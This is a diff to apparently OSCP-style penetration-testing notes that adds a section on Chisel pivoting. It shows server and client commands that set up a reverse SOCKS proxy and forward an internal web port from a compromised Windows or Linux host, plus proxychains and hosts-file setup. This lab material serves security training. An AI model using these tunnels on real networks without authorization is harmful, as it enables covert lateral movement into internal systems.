@@ -406,7 +406,7 @@ run
 | `autoroute` + `socks_proxy` | Non-MSF tools (xfreerdp, nmap, etc.) | Yes |
 | `portfwd` | Single service, quick access | No |
 
-Cross-link: [[The Metasploit Framework#21.3.3 Pivoting with Metasploit|Module 21 §21.3.3]]
+Cross-link: [[21. The Metasploit Framework#21.3.3 Pivoting with Metasploit|Module 21 §21.3.3]]
 
 ---
 
@@ -537,6 +537,50 @@ When a tool hardcodes `127.0.0.1:PORT` and you just need one service exposed, sk
 ```
 
 Server confirms: `tun: proxy#R:127.0.0.1:4141=>10.4.249.215:8008: Listening`
+
+---
+
+## Chisel Combined: Reverse SOCKS + Specific Port Forward (dual-remote, one connection)
+
+When you need BOTH a full SOCKS proxy (for proxychains) AND a specific port forwarded to browse an internal web app, pass both remotes in a single `chisel client` call. One WebSocket connection handles both.
+
+```bash
+# Kali — server (unchanged, --reverse is still required)
+./chisel server -p 8080 --reverse
+
+# Pivot (Windows — one command for both tunnels)
+# Kill stale instances first:
+taskkill /F /IM chisel.exe
+
+# Then:
+.\chisel.exe client <KALI>:8080 R:1081:socks R:80:172.16.6.241:80
+# R:1081:socks    → SOCKS5 proxy on Kali:1081 (use in proxychains4.conf)
+# R:80:172.16.6.241:80  → Kali port 80 forwards to INTERNALSRV1's web server
+
+# Linux pivot (same syntax, different binary)
+/tmp/chisel client <KALI>:8080 R:1081:socks R:4141:10.4.50.215:8008
+```
+
+**proxychains4.conf** entry (matches the SOCKS port above):
+```
+socks5 127.0.0.1 1081
+```
+
+**Browsing the forwarded service:** add the domain to `/etc/hosts`:
+```bash
+echo "127.0.0.1  internalsrv1.beyond.com" | sudo tee -a /etc/hosts
+# Now http://internalsrv1.beyond.com/ routes through the tunnel
+```
+
+Server confirms both remotes:
+```
+tun: proxy#R:127.0.0.1:1081=>socks: Listening
+tun: proxy#R:127.0.0.1:80=>172.16.6.241:80: Listening
+```
+
+> If chisel.exe is locked by a stale process ("file in use"), `taskkill /F /IM chisel.exe` kills all instances. If multiple stale background processes exist, `taskkill` lists their PIDs — verify they are all gone before re-downloading.
+
+See [[27. Assembling the Pieces#27.4.2 Services and Sessions — Internal Network Scan|Module 27 §27.4.2]] and [[Pivoting & Tunneling (Breakdowns)#Chisel dual-remote]].
 
 ---
 
@@ -707,4 +751,4 @@ Proxifier.exe → Profile → Proxy Servers → Add: 127.0.0.1:1080, SOCKS5
 # Open mstsc.exe → connect to final target (routes via SocksOverRDP channel)
 ```
 
-#### Tags: #CommandAppendix #PortForwarding #SSHTunneling #Pivoting #Socat #sshuttle #Proxychains #Plink #Netsh #Meterpreter #autoroute #Rpivot #Dnscat2 #Chisel #ptunnel-ng #ICMP #SocksOverRDP #Proxifier #ProxyCommand #Ncat #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary
+#### Tags: #CommandAppendix #PortForwarding #SSHTunneling #Pivoting #Socat #sshuttle #Proxychains #Plink #Netsh #Meterpreter #autoroute #Rpivot #Dnscat2 #Chisel #ptunnel-ng #ICMP #SocksOverRDP #Proxifier #ProxyCommand #Ncat #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary #DualRemote #ReverseSocks #Module27
